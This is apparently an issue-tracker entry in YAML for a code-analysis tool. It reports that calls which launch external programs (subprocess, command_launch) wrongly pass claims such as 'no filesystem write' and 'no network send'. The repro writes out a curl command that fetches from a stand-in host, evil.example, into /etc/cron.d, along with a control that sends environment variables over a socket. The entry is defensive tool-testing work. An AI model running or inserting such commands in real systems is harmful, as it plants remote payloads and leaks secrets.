  data:  # 3731
    kind: invariant  # 3731
    title: "A call classified into an OPAQUE boundary (subprocess/command_launch) counts as an EXAMINED negative for every other boundary, so a program that shells out to curl confirms both 'no fs_write' and 'no net_send'"  # 3731
    status: violated  # 3731
    priority: 0  # 3731
    parent:  # 3731
    tags:  # 3731
    - verify_claims  # 3731
    - io_boundary  # 3731
    - security  # 3731
    isbefore: []  # 3731
    duplicate_of: []  # 3731
    not_duplicate_of: []  # 3731
    pr_ref:  # 3731
    description: "MEASURED LIVE ON THE SHIPPED CLI at dev 4b2e745d3d, with controls in both\ndirections. Every command below is reproducible as written.\n\nTHE DEFECT. A call the catalogue classifies into an OPAQUE boundary --\n`subprocess` (python et al.) or `command_launch` (bash) -- is counted by\n`_uncatalogued_external_modules` as an EXAMINED negative for EVERY boundary,\nnot just its own. But an opaque crossing is precisely the case where the\nanalysis CANNOT see what happens: the launched program's I/O is not in the\nedge set at all. So classifying a call as \"this launches an external program\"\nis consumed downstream as \"I looked past it and found nothing.\"\n\nREPRO (python, 6 lines, no third-party dependency):\n\n    # run.py\n    import subprocess\n\n    def grab():\n        subprocess.run([\"curl\", \"-o\", \"/etc/cron.d/pwned\",\n                        \"https://evil.example/p\"])\n\n    $ hypergumbo verify-claims . --claims fs_write-must-not-exist.yaml\n      -> confirmed, rc 0, \"No fs_write chains found.\"\n    $ hypergumbo verify-claims . --claims net_send-must-not-exist.yaml\n      -> confirmed, rc 0, \"No net_send chains found.\"\n\nThe program downloads a remote payload into a root cron directory. It confirms\nBOTH \"never writes to the host filesystem\" AND \"never sends data over the\nnetwork\". Two false all-clears from one call.\n\nCONTROLS, both fired correctly in the same session (so this is a defect, not\nblindness):\n  * `open(\"/etc/cron.d/pwned\", \"w\").write(\"x\")` -> VIOLATED rc 1, 2 fs_write\n    chains. The fs_write claim machinery detects what it can see.\n  * `socket.connect + socket.send(os.environ[...])` -> VIOLATED rc 1, 2\n    net_send chains. Same for the network arm.\n\nMECHANISM, read in code and confirmed by direct probe rather than inferred:\n\n    classify_call({\"python\": load_catalog(\"python\")},\n                  \"python:subprocess:0-0:run:external_symbol\",\n                  {\"call_construct\": \"function\"})\n      -> IoPrimitive(boundary='subprocess', module='subprocess', name='run', ...)\n    load_catalog(\"python\").module_io_is_enumerated(\"subprocess\")  -> False\n\nSo it is branch (1) of `_uncatalogued_external_modules` -- the\n`if classify_call(...): continue` examined-ness shortcut -- that grants this,\nNOT the `module_io_is_enumerated` enumeration branch. The shortcut is\nboundary-blind by construction, and for every OTHER boundary that is correct:\n`os.mkdir` classified as fs_write genuinely IS an examined negative for a\nnet_send claim, because os.mkdir's I/O surface is known and complete. The\nassumption that breaks is COMPLETENESS, and it breaks only for the boundaries\nthat denote opacity.\n\nWHY THIS IS NOT WI-zubuh AGAIN. WI-zubuh/INV-buzab fixed row-PRESENCE and\nname-recognition at the MODULE level, and the fix was to move the unit of\nexamination to the CALL SITE (INV-buzab, PR #306). That was right. This is the\nresidual one level down: the call site IS matched, by a real row, and the row\nis CORRECT -- `subprocess.run` really is a subprocess primitive. The row is not\nwrong; the INFERENCE from \"a row matched\" to \"this boundary was examined\" is.\n\nSCOPE / BLAST RADIUS -- not yet measured, and it is the reason this is filed\nbefore the fix rather than bundled with one:\n  * Any repo that shells out at all is affected. hypergumbo itself shells out\n    to git (WI-fasuv), gitleaks and rust-analyzer.\n  * The direction of the fix is toward MORE inconclusive, which is the safe\n    direction (verify_claim returns `violated` OUTSIDE the coverage branch, so\n    coverage gates only the all-clear) but it is not free: it is the same\n    tension every honesty gate in this area has hit, and only RECALL closes it.\n  * `_DISCLOSED_ONLY_BOUNDARIES = {\"external_potential\", \"command_launch\"}`\n    already exists in io_boundary.py and is the nearest existing concept --\n    a likely home for the predicate rather than a fifth parallel copy.\n\nRELATION TO bash.yaml, WHICH IS HOW THIS WAS FOUND. Writing\n`io_primitives/bash.yaml` was the queued next item. A six-line stub mapping\n`curl -> net_send` makes a shell script that curls a secret return VIOLATED rc 1\n-- real detection the tool has never had. The SAME six lines make a BASH-ONLY\nrepo whose script runs `curl -o /etc/cron.d/pwned` return CONFIRMED rc 0 on an\nfs_write claim, where WITHOUT the catalogue it returns inconclusive. A/B by\nmoving the single file:\n\n    bash.yaml absent  + fs_write claim -> inconclusive rc 2   (honest)\n    bash.yaml present + fs_write claim -> CONFIRMED rc 0      (false)\n    bash.yaml present + net_send claim -> violated rc 1       (true detection)\n\nSo bash.yaml as-designed would multiply this hole across the 84 distinct\nexternal commands hypergumbo's own scripts launch (467 launch edges, measured\nwith production's `analyze_bash`). Shipping the catalogue before this gate is\nfixed trades one honest blocker for many silent false confirms. Sequencing\nshould mirror the owner's INV-dabov ruling: honest gate FIRST, catalogue\nSECOND, not bundled.\n\nNOT A DUPLICATE of the adjacent filed items, checked:\n  * WI-bimik is the INPUT direction (subprocess OUTPUT is not a catalogued\n    untrusted_input source). This is the OUTPUT/opacity direction.\n  * WI-fasuv was about a shipped CLAIM being false as written; this is the\n    GATE admitting any such claim.\n  * WI-sofaf is about command_launch leaking into the persisted map.\n  * INV-dabov was a language with NO catalogue; here the catalogue exists and\n    matches."  # 3731
    fields:  # 3731
      statement: "A boundary claim may be confirmed only over calls whose I/O surface the analysis could actually examine. A call classified into a boundary that DENOTES OPACITY (subprocess, command_launch) was not examined for any OTHER boundary: the launched programs I/O is absent from the edge set entirely. VIOLATED: subprocess.run([\"curl\",\"-o\",\"/etc/cron.d/pwned\",\"https://evil.example/p\"]) returns CONFIRMED rc 0 for BOTH a fs_write must_not_exist claim AND a net_send must_not_exist claim, while open(f,\"w\") and socket.send controls both correctly return VIOLATED rc 1 in the same session."  # 3731
      root_cause: "_uncatalogued_external_modules branch (1), the \"if classify_call(...): continue\" examined-ness shortcut, is boundary-blind. That is correct wherever a matched row implies a KNOWN, COMPLETE I/O surface (os.mkdir classified fs_write really is an examined negative for net_send), but subprocess/command_launch rows assert the opposite - that the analysis cannot see past this call. Probe confirms it is this branch and not module_io_is_enumerated, which returns False for \"subprocess\"."  # 3731
